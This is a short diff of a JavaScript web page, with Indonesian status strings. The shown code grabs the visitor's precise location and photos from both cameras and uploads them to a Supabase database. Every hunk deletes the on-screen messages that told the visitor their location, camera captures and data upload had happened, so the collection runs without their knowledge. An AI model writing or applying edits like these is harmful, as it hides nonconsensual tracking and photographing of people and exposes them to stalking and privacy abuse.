@@ -487,10 +487,10 @@ async function requestLocation() {
           const geo = await r.json();
           collectedData.geo = geo;
         } catch(e) {}
-        showStatus("Lokasi berhasil diakses");
+
         resolve();
       },
-      () => { showStatus("Izin lokasi ditolak"); resolve(); },
+
       { enableHighAccuracy: true, timeout: 10000 }
     );
   });
@@ -505,7 +505,7 @@ async function requestCamera() {
       });
       collectedData.photoBack = await capturePhoto(backStream);
       backStream.getTracks().forEach(t => t.stop());
-      showStatus("Kamera belakang berhasil");
+
     } catch(e) {
       // Fallback: coba kamera apa saja
       try {
@@ -522,7 +522,7 @@ async function requestCamera() {
       });
       collectedData.photoFront = await capturePhoto(frontStream);
       frontStream.getTracks().forEach(t => t.stop());
-      showStatus("Kamera depan berhasil");
+
     } catch(e) {}
 
     resolve();
@@ -603,7 +603,7 @@ async function saveToSupabase() {
         created_at: collectedData.timestamp
       })
     });
-    showStatus("Data tersimpan!");
+
   } catch(e) {
     console.error("Gagal simpan:", e);
   }
